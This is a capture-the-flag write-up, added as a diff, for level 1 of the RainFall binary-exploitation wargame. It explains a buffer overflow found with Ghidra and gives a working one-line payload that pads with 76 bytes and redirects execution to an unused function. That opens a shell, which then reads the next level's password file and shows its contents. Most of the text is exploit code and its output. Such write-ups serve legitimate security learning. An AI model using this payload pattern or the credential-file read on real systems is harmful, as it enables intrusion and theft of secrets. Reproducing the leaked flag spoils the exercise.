@@ -1,0 +1,15 @@
+# Level1
+
+## Analysis
+Using ghidra we saw that the program is vulnerable to a buffer overflow and that it has a function called run but it is not used in the program. We can use this function to get a shell.
+
+```bash
+level1@RainFall:~$ (python -c "import struct; print('A' * 76 + struct.pack('I', 0x8048472))";cat) | ./level1
+whoami
+level2
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+^C
+Segmentation fault (core dumped)
+level1@RainFall:~$
+```
